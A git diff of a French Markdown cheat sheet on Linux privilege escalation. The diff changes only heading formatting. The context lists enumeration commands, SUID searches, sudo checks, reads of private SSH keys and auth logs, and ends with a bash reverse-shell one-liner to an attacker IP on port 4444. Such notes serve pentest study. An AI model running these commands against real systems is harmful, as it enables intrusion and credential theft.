@@ -2,7 +2,7 @@
 
 Voici une liste des commandes utiles pour rechercher et exploiter des vulnérabilités d'escalade de privilèges (privilege escalation) sur un système Linux, avec des explications pour chaque commande.
 
-#### 1. **Informations sur le système**
+**1. Informations sur le système**
 
 **Système et version**
 
@@ -33,7 +33,7 @@ hostname      # Affiche le nom de l'hôte
 hostnamectl   # Affiche des informations détaillées sur le système et le nom d'hôte (si disponible)
 ```
 
-#### 2. **Informations sur l'utilisateur et les groupes**
+**2. Informations sur l'utilisateur et les groupes**
 
 **Utilisateur actuel**
 
@@ -78,7 +78,7 @@ Cette commande affiche les commandes que l'utilisateur peut exécuter avec `sudo
 sudo -l   # Liste les permissions sudo pour l'utilisateur actuel
 ```
 
-#### 3. **Permissions des fichiers et répertoires**
+**3. Permissions des fichiers et répertoires**
 
 **Rechercher les fichiers SUID/SGID**
 
@@ -115,7 +115,7 @@ find / -type f -writable 2>/dev/null    # Trouve tous les fichiers accessibles e
 find / -type f -perm -o+w 2>/dev/null   # Trouve tous les fichiers accessibles en écriture par tous les utilisateurs
 ```
 
-#### 4. **Services et processus**
+**4. Services et processus**
 
 **Processus en cours d'exécution**
 
@@ -144,7 +144,7 @@ cat /etc/crontab       # Affiche les tâches planifiées globales
 ls -la /etc/cron.*     # Liste les répertoires contenant des tâches planifiées
 ```
 
-#### 5. **Réseau**
+**5. Réseau**
 
 **Interfaces réseau et configuration**
 
@@ -175,7 +175,7 @@ iptables -L           # Affiche les règles de pare-feu (iptables)
 ufw status verbose    # Affiche le statut du pare-feu UFW et les règles configurées
 ```
 
-#### 6. **Informations système et kernel**
+**6. Informations système et kernel**
 
 **Informations sur la mémoire et la CPU**
 
@@ -196,7 +196,7 @@ lsmod               # Affiche tous les modules du noyau chargés
 cat /proc/modules   # Affiche également les modules du noyau chargés
 ```
 
-#### 7. **Informations sur les applications**
+**7. Informations sur les applications**
 
 **Paquets installés**
 
@@ -216,7 +216,7 @@ ls -la /usr/bin/   # Liste les applications installées dans /usr/bin
 ls -la /sbin/      # Liste les applications installées dans /sbin
 ```
 
-#### 8. **Exploration de fichiers et d'accès**
+**8. Exploration de fichiers et d'accès**
 
 **Fichiers de configuration SSH**
 
@@ -244,7 +244,7 @@ cat ~/.ssh/id_rsa          # Affiche la clé privée SSH
 cat ~/.ssh/authorized_keys # Affiche les clés publiques autorisées pour SSH
 ```
 
-#### 9. **Logs et journaux**
+**9. Logs et journaux**
 
 **Fichiers de log système**
 
@@ -255,7 +255,7 @@ cat /var/log/syslog    # Affiche les logs système
 cat /var/log/auth.log  # Affiche les logs d'authentification
 ```
 
-#### 10. **AppArmor et SELinux**
+**10. AppArmor et SELinux**
 
 **Statut de AppArmor**
 
@@ -274,7 +274,7 @@ sestatus     # Affiche le statut SELinux
 getenforce   # Affiche le mode SELinux (Enforcing, Permissive, Disabled)
 ```
 
-#### 11. **Scripts d'attaque et d'exploitation**
+**11. Scripts d'attaque et d'exploitation**
 
 **Recherche d'exploits locaux connus**
 
@@ -303,4 +303,3 @@ commande pour activer un shell root via nc (à faire sur machine cible):
 ```bash
 echo 'bash -i >& /dev/tcp/10.21.30.199/4444 0>&1'
 ```
-
